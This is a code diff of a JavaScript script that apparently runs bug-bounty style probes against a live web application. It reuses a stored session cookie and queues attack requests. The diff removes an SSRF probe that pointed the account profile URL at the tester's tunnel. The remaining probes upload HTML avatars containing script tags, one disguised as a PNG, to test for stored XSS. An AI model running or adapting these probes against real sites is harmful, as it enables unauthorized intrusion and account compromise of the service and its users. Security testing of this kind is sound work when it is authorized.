@@ -3,7 +3,7 @@
 import fs from "fs";
 const APP = "https://aarme.cyberaar.io";
 const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
-const COOKIE = fs.existsSync("/tmp/opencode/cyberaar/session-cookie.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim() : "";
+const COOKIE = fs.existsSync("/tmp/opencode/cyberaar/session-alias.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-alias.txt", "utf8").trim() : (fs.existsSync("/tmp/opencode/cyberaar/session-cookie.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim() : "");
 const TUN = fs.existsSync("/tmp/opencode/cyberaar/tunnel-url.txt") ? fs.readFileSync("/tmp/opencode/cyberaar/tunnel-url.txt", "utf8").trim() : "";
 const LOG = "/tmp/opencode/cyberaar/spaced.log";
 const { appendFileSync, writeFileSync } = await import("node:fs");
@@ -27,7 +27,6 @@ async function postFile(path, filename, type, content) {
 }
 
 const QUEUE = [
-  ["SSRF-1 : inscription avec profile = mon tunnel (le serveur fetch-t-il l URL ?)", async () => postJSON("/api/aarme/account/register", { name: "bb-probe-2", email: "bb-probe-2@maxxspace.com", profile: TUN + "/ssrf-registration", level: "Debutant (je commence)", password: "Bb-test-2026-ok!", accord: true, lang: "fr", hp: "" })],
   ["AVATAR-1 : PNG valide (controle)", async () => postFile("/api/aarme/account/avatar", "photo.png", "image/png", PNG)],
   ["AVATAR-2 : HTML type text/html (XSS stockee ?)", async () => postFile("/api/aarme/account/avatar", "x.html", "text/html", Buffer.from("<html><body><script>alert(document.domain)</script>PING-AVATAR</body></html>"))],
   ["AVATAR-3 : HTML deguise en image/png", async () => postFile("/api/aarme/account/avatar", "x.png", "image/png", Buffer.from("<html><body><script>alert(1)</script>PING-PNG</body></html>"))],
